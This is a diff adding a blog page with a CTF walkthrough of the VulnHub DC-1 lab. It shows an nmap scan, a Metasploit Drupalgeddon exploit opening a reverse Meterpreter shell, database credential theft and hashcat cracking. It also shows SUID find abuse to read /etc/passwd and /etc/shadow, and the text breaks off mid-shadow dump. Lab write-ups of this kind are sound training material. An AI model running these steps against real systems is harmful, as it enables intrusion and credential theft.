@@ -1,0 +1,761 @@
+<!DOCTYPE html>
+<html lang=en>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="DescriptionDC-1 is a purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing. It was designed to be a challenge for beginners, but just how easy it">
+<meta name="keywords" content="vulnhub,ctf,walkthrough">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DC-1 Walkthrough">
+<meta property="og:url" content="https://infosecadventures.com/2019/03/08/DC-1-Walkthrough/index.html">
+<meta property="og:site_name" content="InfoSec Adventures">
+<meta property="og:description" content="DescriptionDC-1 is a purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing. It was designed to be a challenge for beginners, but just how easy it">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://infosecadventures.com/2019/03/08/DC-1-Walkthrough/dc1.png">
+<meta property="og:image" content="https://infosecadventures.com/2019/03/08/DC-1-Walkthrough/drupal.png">
+<meta property="og:updated_time" content="2019-05-01T23:00:51.393Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="DC-1 Walkthrough">
+<meta name="twitter:description" content="DescriptionDC-1 is a purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing. It was designed to be a challenge for beginners, but just how easy it">
+<meta name="twitter:image" content="https://infosecadventures.com/2019/03/08/DC-1-Walkthrough/dc1.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/android-chrome-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+
+    <title>DC-1 Walkthrough</title>
+
+    <link rel="stylesheet" href="/css/style.css">
+    
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    
+    
+    
+      <link rel="alternate" href="/atom.xml" title="InfoSec Adventures" type="application/atom+xml">
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Categories</a></li>
+         
+          <li><a href="/instagram/">Instagram Feed</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2019/03/31/Hack-The-Box-Curling-Walkthrough/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2019/03/03/Kuya-Walkthrough/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://infosecadventures.com/2019/03/08/DC-1-Walkthrough/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://infosecadventures.com/2019/03/08/DC-1-Walkthrough/&text=DC-1 Walkthrough"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://infosecadventures.com/2019/03/08/DC-1-Walkthrough/&title=DC-1 Walkthrough"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=DC-1 Walkthrough&body=Check out this article: https://infosecadventures.com/2019/03/08/DC-1-Walkthrough/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://infosecadventures.com/2019/03/08/DC-1-Walkthrough/&title=DC-1 Walkthrough"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Description"><span class="toc-number">1.</span> <span class="toc-text">Description</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Scanning"><span class="toc-number">1.1.</span> <span class="toc-text">Scanning</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Getting-access"><span class="toc-number">1.2.</span> <span class="toc-text">Getting access</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Accessing-the-database"><span class="toc-number">2.</span> <span class="toc-text">Accessing the database</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Dumping-database-hashes"><span class="toc-number">2.1.</span> <span class="toc-text">Dumping database hashes</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Find-with-SUID"><span class="toc-number">2.2.</span> <span class="toc-text">Find with SUID</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Cracking-another-hash"><span class="toc-number">2.3.</span> <span class="toc-text">Cracking another hash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Access-via-SSH"><span class="toc-number">2.4.</span> <span class="toc-text">Access via SSH</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Popping-a-root-shell"><span class="toc-number">2.5.</span> <span class="toc-text">Popping a root shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-you-go"><span class="toc-number">2.6.</span> <span class="toc-text">Before you go</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        DC-1 Walkthrough
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">InfoSec Adventures</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2019-03-08T06:45:43.000Z" itemprop="datePublished">2019.03.08.</time>
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/CTF-Walkthroughs/">CTF Walkthroughs</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/ctf/">ctf</a>, <a class="tag-link" href="/tags/vulnhub/">vulnhub</a>, <a class="tag-link" href="/tags/walkthrough/">walkthrough</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <script type="text/javascript" src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5bf72b3154516f79"></script>
+
+<p><img src="dc1.png" alt></p>
+<h1 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h1><p>DC-1 is a purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing. It was designed to be a challenge for beginners, but just how easy it is will depend on your skills and knowledge, and your ability to learn. To successfully complete this challenge, you will require Linux skills, familiarity with the Linux command line and experience with basic penetration testing tools, such as the tools that can be found on Kali Linux, or Parrot Security OS.</p>
+<p>There are multiple ways of gaining root, however, I have included some flags which contain clues for beginners. There are five flags in total, but the ultimate goal is to find and read the flag in root’s home directory. You don’t even need to be root to do this however, you will require root privileges. Depending on your skill level, you may be able to skip finding most of these flags and go straight for root. Beginners may encounter challenges that they have never come across previously, but a Google search should be all that is required to obtain the information required to complete this challenge.</p>
+<h2 id="Scanning"><a href="#Scanning" class="headerlink" title="Scanning"></a>Scanning</h2><p>I scanned every port <code>-p-</code> and ran default scripts with <code>-sC</code> as usual. I use the <code>-A</code> switch to enable OS detection, version detection, script scanning and traceroute. Here is the scan result:</p>
+<pre><code>▲ ~ nmap -A -sC -p- 192.168.1.45
+Nmap scan report for DC-1 (192.168.1.45)
+Host is up (0.00021s latency).
+Not shown: 65531 closed ports
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
+| ssh-hostkey:
+|   1024 c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f (DSA)
+|   2048 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 (RSA)
+|_  256 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 (ECDSA)
+80/tcp    open  http    Apache httpd 2.2.22 ((Debian))
+|_http-generator: Drupal 7 (http://drupal.org)
+| http-robots.txt: 36 disallowed entries (15 shown)
+| /includes/ /misc/ /modules/ /profiles/ /scripts/
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
+|_/LICENSE.txt /MAINTAINERS.txt
+|_http-server-header: Apache/2.2.22 (Debian)
+|_http-title: Welcome to Drupal Site | Drupal Site
+111/tcp   open  rpcbind 2-4 (RPC #100000)
+| rpcinfo:
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100024  1          44589/tcp  status
+|_  100024  1          54361/udp  status
+44589/tcp open  status  1 (RPC #100024)
+MAC Address: 08:00:27:DE:A5:8C (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X
+OS CPE: cpe:/o:linux:linux_kernel:3
+OS details: Linux 3.2 - 3.16
+Network Distance: 1 hop
+</code></pre><p>We have SSH, which is not vulnerable and it looks like we have a Drupal 7 CMS installation too. I tried <code>nikto</code> and  <code>dirb</code>, but they didn’t pick up anything useful.<br>So, I went on to check out the site and searched for version numbers. I also tried <code>admin - admin</code> on the login panel, but no luck.</p>
+<h2 id="Getting-access"><a href="#Getting-access" class="headerlink" title="Getting access"></a>Getting access</h2><p>Some Drupal sites are vulnerable to drupalgeddon, which is basically an SQL injection vulnerability disclosed back in late 2014. I fired up my metasploit console and searched for <code>drupal</code>.</p>
+<pre><code>msf5 &gt; search drupal
+
+Matching Modules
+================
+
+Name                                           Disclosure Date  Rank       Check  Description
+----                                           ---------------  ----       -----  -----------
+auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Yes    Drupal OpenID External Entity Injection
+auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Yes    Drupal Views Module Users Enumeration
+exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection
+exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution
+exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection
+exploit/unix/webapp/drupal_restws_exec         2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution
+exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution
+
+
+msf5 &gt; use exploit/multi/http/drupal_drupageddon
+msf5 exploit(multi/http/drupal_drupageddon) &gt; show options
+
+Module options (exploit/multi/http/drupal_drupageddon):
+
+Name       Current Setting  Required  Description
+----       ---------------  --------  -----------
+Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+RHOSTS                      yes       The target address range or CIDR identifier
+RPORT      80               yes       The target port (TCP)
+SSL        false            no        Negotiate SSL/TLS for outgoing connections
+TARGETURI  /                yes       The target URI of the Drupal installation
+VHOST                       no        HTTP server virtual host
+
+
+Exploit target:
+
+Id  Name
+--  ----
+0   Drupal 7.0 - 7.31 (form-cache PHP injection method)
+
+
+msf5 exploit(multi/http/drupal_drupageddon) &gt;
+</code></pre><p>You can find more about this module on rapid7’s site: <a href="https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon" target="_blank" rel="noopener">https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon</a> I set the <code>rhosts</code> variable and simply typed <code>exploit</code>.</p>
+<pre><code>msf5 exploit(multi/http/drupal_drupageddon) &gt; set rhosts 192.168.1.45
+rhosts =&gt; 192.168.1.45
+msf5 exploit(multi/http/drupal_drupageddon) &gt; exploit
+
+[*] Started reverse TCP handler on 192.168.1.134:4444
+[*] Sending stage (38247 bytes) to 192.168.1.45
+[*] Meterpreter session 1 opened (192.168.1.134:4444 -&gt; 192.168.1.45:38628)
+
+meterpreter &gt;
+</code></pre><p>This was easy, right? I typed <code>shell</code> to conveniently investigate the files and directories on the server.</p>
+<pre><code>meterpreter &gt; shell
+Process 3110 created.
+Channel 0 created.
+ls -la
+total 188
+drwxr-xr-x  9 www-data www-data  4096 Feb 19 23:45 .
+drwxr-xr-x 12 root     root      4096 Feb 19 23:10 ..
+-rw-r--r--  1 www-data www-data   174 Nov 21  2013 .gitignore
+-rw-r--r--  1 www-data www-data  5767 Nov 21  2013 .htaccess
+-rw-r--r--  1 www-data www-data  1481 Nov 21  2013 COPYRIGHT.txt
+-rw-r--r--  1 www-data www-data  1451 Nov 21  2013 INSTALL.mysql.txt
+-rw-r--r--  1 www-data www-data  1874 Nov 21  2013 INSTALL.pgsql.txt
+-rw-r--r--  1 www-data www-data  1298 Nov 21  2013 INSTALL.sqlite.txt
+-rw-r--r--  1 www-data www-data 17861 Nov 21  2013 INSTALL.txt
+-rwxr-xr-x  1 www-data www-data 18092 Nov  1  2013 LICENSE.txt
+-rw-r--r--  1 www-data www-data  8191 Nov 21  2013 MAINTAINERS.txt
+-rw-r--r--  1 www-data www-data  5376 Nov 21  2013 README.txt
+-rw-r--r--  1 www-data www-data  9642 Nov 21  2013 UPGRADE.txt
+-rw-r--r--  1 www-data www-data  6604 Nov 21  2013 authorize.php
+-rw-r--r--  1 www-data www-data   720 Nov 21  2013 cron.php
+-rw-r--r--  1 www-data www-data    52 Feb 19 23:20 flag1.txt
+drwxr-xr-x  4 www-data www-data  4096 Nov 21  2013 includes
+-rw-r--r--  1 www-data www-data   529 Nov 21  2013 index.php
+-rw-r--r--  1 www-data www-data   703 Nov 21  2013 install.php
+drwxr-xr-x  4 www-data www-data  4096 Nov 21  2013 misc
+drwxr-xr-x 42 www-data www-data  4096 Nov 21  2013 modules
+drwxr-xr-x  5 www-data www-data  4096 Nov 21  2013 profiles
+-rw-r--r--  1 www-data www-data  1561 Nov 21  2013 robots.txt
+drwxr-xr-x  2 www-data www-data  4096 Nov 21  2013 scripts
+drwxr-xr-x  4 www-data www-data  4096 Nov 21  2013 sites
+drwxr-xr-x  7 www-data www-data  4096 Nov 21  2013 themes
+-rw-r--r--  1 www-data www-data 19941 Nov 21  2013 update.php
+-rw-r--r--  1 www-data www-data  2178 Nov 21  2013 web.config
+-rw-r--r--  1 www-data www-data   417 Nov 21  2013 xmlrpc.php
+</code></pre><p>The first flag is right in front of us, which contained the following hint:</p>
+<blockquote>
+<p>Every good CMS needs a config file - and so do you.</p>
+</blockquote>
+<p>The goal was pretty clear, I had to find a juicy config file. I just freely explored the directory to see, what I can find. In the <code>sites/default</code> directory, there was a <code>settings.php</code> file.</p>
+<pre><code>cd sites
+ls -la
+total 24
+drwxr-xr-x 4 www-data www-data 4096 Nov 21  2013 .
+drwxr-xr-x 9 www-data www-data 4096 Feb 19 23:45 ..
+-rw-r--r-- 1 www-data www-data  904 Nov 21  2013 README.txt
+drwxr-xr-x 4 www-data www-data 4096 Nov 21  2013 all
+dr-xr-xr-x 3 www-data www-data 4096 Feb 19 23:48 default
+-rw-r--r-- 1 www-data www-data 2365 Nov 21  2013 example.sites.php
+cd default
+ls -la
+total 52
+dr-xr-xr-x 3 www-data www-data  4096 Feb 19 23:48 .
+drwxr-xr-x 4 www-data www-data  4096 Nov 21  2013 ..
+-rw-r--r-- 1 www-data www-data 23202 Nov 21  2013 default.settings.php
+drwxrwxr-x 3 www-data www-data  4096 Feb 19 23:10 files
+-r--r--r-- 1 www-data www-data 15989 Feb 19 23:48 settings.php
+</code></pre><p>In the beginning of the file, there was a comment, which contained the second flag and below that I was presented with the username and password for the database.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * flag2</span></span><br><span class="line"><span class="comment"> * Brute force and dictionary attacks aren't the</span></span><br><span class="line"><span class="comment"> * only ways to gain access (and you WILL need access).</span></span><br><span class="line"><span class="comment"> * What can you do with these credentials?</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">$databases = <span class="keyword">array</span> (</span><br><span class="line">  <span class="string">'default'</span> =&gt; </span><br><span class="line">  <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">'default'</span> =&gt; </span><br><span class="line">    <span class="keyword">array</span> (</span><br><span class="line">      <span class="string">'database'</span> =&gt; <span class="string">'drupaldb'</span>,</span><br><span class="line">      <span class="string">'username'</span> =&gt; <span class="string">'dbuser'</span>,</span><br><span class="line">      <span class="string">'password'</span> =&gt; <span class="string">'R0ck3t'</span>,</span><br><span class="line">      <span class="string">'host'</span> =&gt; <span class="string">'localhost'</span>,</span><br><span class="line">      <span class="string">'port'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">      <span class="string">'driver'</span> =&gt; <span class="string">'mysql'</span>,</span><br><span class="line">      <span class="string">'prefix'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">    ),</span><br><span class="line">  ),</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment"># -- snip --</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Brute force and dictionary attacks aren’t the only ways to gain access (and you WILL need access). What can you do with these credentials?</p>
+</blockquote>
+<h1 id="Accessing-the-database"><a href="#Accessing-the-database" class="headerlink" title="Accessing the database"></a>Accessing the database</h1><p>In order to log in to the database, we have to have a tty or pseudo-tty shell. At the moment, we have a very limited shell. Python was installed on the machine and all I had to do was:</p>
+<pre><code>python -c &apos;import pty; pty.spawn(&quot;/bin/sh&quot;)&apos;
+$ 
+</code></pre><p>I had everything to log in to the mysql database. I looked at the databases and selected the <code>drupaldb</code>.</p>
+<pre><code>$ mysql -u dbuser -p
+Enter password: R0ck3t
+
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 69
+Server version: 5.5.60-0+deb7u1 (Debian)
+
+Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.
+
+mysql&gt; show databases;
+show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| drupaldb           |
++--------------------+
+2 rows in set (0.00 sec)
+
+mysql&gt; use drupaldb;
+use drupaldb;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql&gt;
+</code></pre><p>Before making any queries, we have to know the table names. The result quite big, but I focused on the important one (the <code>users</code> table).</p>
+<pre><code>mysql&gt; show tables;
++-----------------------------+
+| Tables_in_drupaldb          |
++-----------------------------+
+| actions                     |
+| authmap                     |
+| batch                       |
+| block                       |
+| block_custom                |
+| block_node_type             |
+| block_role                  |
+| blocked_ips                 |
+| cache                       |
+| cache_block                 |
+| cache_bootstrap             |
+| cache_field                 |
+| cache_filter                |
+| cache_form                  |
+| cache_image                 |
+| cache_menu                  |
+| cache_page                  |
+| cache_path                  |
+| cache_update                |
+| cache_views                 |
+| cache_views_data            |
+| comment                     |
+| ctools_css_cache            |
+| ctools_object_cache         |
+| date_format_locale          |
+| date_format_type            |
+| date_formats                |
+| field_config                |
+| field_config_instance       |
+| field_data_body             |
+| field_data_comment_body     |
+| field_data_field_image      |
+| field_data_field_tags       |
+| field_revision_body         |
+| field_revision_comment_body |
+| field_revision_field_image  |
+| field_revision_field_tags   |
+| file_managed                |
+| file_usage                  |
+| filter                      |
+| filter_format               |
+| flood                       |
+| history                     |
+| image_effects               |
+| image_styles                |
+| menu_custom                 |
+| menu_links                  |
+| menu_router                 |
+| node                        |
+| node_access                 |
+| node_comment_statistics     |
+| node_revision               |
+| node_type                   |
+| queue                       |
+| rdf_mapping                 |
+| registry                    |
+| registry_file               |
+| role                        |
+| role_permission             |
+| search_dataset              |
+| search_index                |
+| search_node_links           |
+| search_total                |
+| semaphore                   |
+| sequences                   |
+| sessions                    |
+| shortcut_set                |
+| shortcut_set_users          |
+| system                      |
+| taxonomy_index              |
+| taxonomy_term_data          |
+| taxonomy_term_hierarchy     |
+| taxonomy_vocabulary         |
+| url_alias                   |
+| users                       |
+| users_roles                 |
+| variable                    |
+| views_display               |
+| views_view                  |
+| watchdog                    |
++-----------------------------+
+80 rows in set (0.00 sec)
+
+mysql&gt;
+</code></pre><h2 id="Dumping-database-hashes"><a href="#Dumping-database-hashes" class="headerlink" title="Dumping database hashes"></a>Dumping database hashes</h2><p>The ran the following query to print out every entry in that specific table. I had to cut out some columns because the result was too long.</p>
+<pre><code>mysql&gt; select * from users;
++-----+-------+---------------------------------------------------------+-------------------+
+| uid | name  | pass                                                    | mail              |
++-----+-------+---------------------------------------------------------+-------------------+
+|   0 |       |                                                         |                   |
+|   1 | admin | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR | admin@example.com |
+|   2 | Fred  | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg | fred@example.org  |
++-----+-------+---------------------------------------------------------+-------------------+
+3 rows in set (0.00 sec)
+</code></pre><p>Well, drupal is also known to have very secure hashes. Are they secure enough? I let my 1070 TI GPU determine that. I downloaded <code>hashcat</code> to my Windows PC and the <code>rockyou.txt</code> word list.</p>
+<pre><code>$ ./hashcat64.exe -m 7900 hashes.txt rockyou.txt
+hashcat (v5.1.0) starting...
+
+OpenCL Platform #1: NVIDIA Corporation
+======================================
+* Device #1: GeForce GTX 1070 Ti, 2048/8192 MB allocatable, 19MCU
+
+Hashes: 3 digests; 3 unique digests, 3 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Applicable optimizers:
+* Zero-Byte
+* Uses-64-Bit
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Watchdog: Temperature abort trigger set to 90c
+
+Dictionary cache built:
+* Filename..: rockyou.txt
+* Passwords.: 14344391
+* Bytes.....: 139921497
+* Keyspace..: 14344384
+* Runtime...: 2 secs
+
+
+$S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR:53cr3t
+Approaching final keyspace - workload adjusted.
+
+
+Session..........: hashcat
+Status...........: Exhausted
+Hash.Type........: Drupal7
+Hash.Target......: hashes.txt
+Time.Started.....: Fri Mar 08 09:19:57 2019 (7 mins, 52 secs)
+Time.Estimated...: Fri Mar 08 09:27:49 2019 (0 secs)
+Guess.Base.......: File (rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:    36639 H/s (2.15ms) @ Accel:128 Loops:32 Thr:64 Vec:1
+Recovered........: 2/3 (66.67%) Digests, 2/3 (66.67%) Salts
+Progress.........: 43033152/43033152 (100.00%)
+Rejected.........: 0/43033152 (0.00%)
+Restore.Point....: 14344384/14344384 (100.00%)
+Restore.Sub.#1...: Salt:2 Amplifier:0-1 Iteration:16352-16384
+Candidates.#1....: $HEX[284d6f75746f6e] -&gt; $HEX[042a0337c2a156616d6f732103]
+Hardware.Mon.#1..: Temp: 69c Fan: 47% Util: 96% Core:1809MHz Mem:3802MHz Bus:16
+</code></pre><p>I didn’t have to wait too long for the admin’s password. The password was <code>53cr3t</code>. I logged in and under the content menu, I found the third flag.</p>
+<p><img src="drupal.png" alt></p>
+<blockquote>
+<p>Special PERMS will help FIND the passwd - but you’ll need to -exec that command to work out how to get what’s in the shadow.</p>
+</blockquote>
+<p>These hints are almost ruining the experience for me…</p>
+<h2 id="Find-with-SUID"><a href="#Find-with-SUID" class="headerlink" title="Find with SUID"></a>Find with SUID</h2><p>I used the well-known <code>LinEnum.sh</code> script to get a better grasp of the system and possibly confirm that find command with special permissions.</p>
+<pre><code>$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+--2019-03-08 18:46:36--  https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.112.133
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.112.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 45639 (45K) [text/plain]
+Saving to: `LinEnum.sh&apos;
+
+100%[======================================&gt;] 45,639      --.-K/s   in 0.04s
+
+2019-03-08 18:46:37 (1.13 MB/s) - `LinEnum.sh&apos; saved [45639/45639]
+
+$ chmod +x LinEnum.sh
+$ ./LinEnum.sh
+</code></pre><p>The interesting part from the output was this:</p>
+<pre><code>[+] Possibly interesting SUID files:
+-rwsr-xr-x 1 root root 162424 Jan  6  2012 /usr/bin/find
+</code></pre><p>SETUID and SETGID are Unix access rights flags that allow users to run an executable with the permissions of the executable’s owner or group respectively and to change behavior in directories. They are often used to allow users on a computer system to run programs with temporarily elevated privileges in order to perform a specific task.</p>
+<p>In this case, we don’t have to be root to execute commands as root. The hint or flag said that it helps to “find” the passwd, so here is how I printed out the <code>passwd</code> file:</p>
+<pre><code>find / -name passwd -exec cat {} \;
+#
+# The PAM configuration file for the Shadow `passwd&apos; service
+#
+
+@include common-password
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+Debian-exim:x:101:104::/var/spool/exim4:/bin/false
+statd:x:102:65534::/var/lib/nfs:/bin/false
+messagebus:x:103:107::/var/run/dbus:/bin/false
+sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
+mysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/false
+flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash
+</code></pre><h2 id="Cracking-another-hash"><a href="#Cracking-another-hash" class="headerlink" title="Cracking another hash"></a>Cracking another hash</h2><p>As you can see, there is a <code>flag4</code> user. I moved on to get the shadow file, too.</p>
+<pre><code>find / -name shadow -exec cat {} \;
+root:$6$rhe3rFqk$NwHzwJ4H7abOFOM67.Avwl3j8c05rDVPqTIvWg8k3yWe99pivz/96.K7IqPlbBCmzpokVmn13ZhVyQGrQ4phd/:17955:0:99999:7:::
+daemon:*:17946:0:99999:7:::
+bin:*:17946:0:99999:7:::
+sys:*:17946:0:99999:7:::
+sync:*:17946:0:99999:7:::
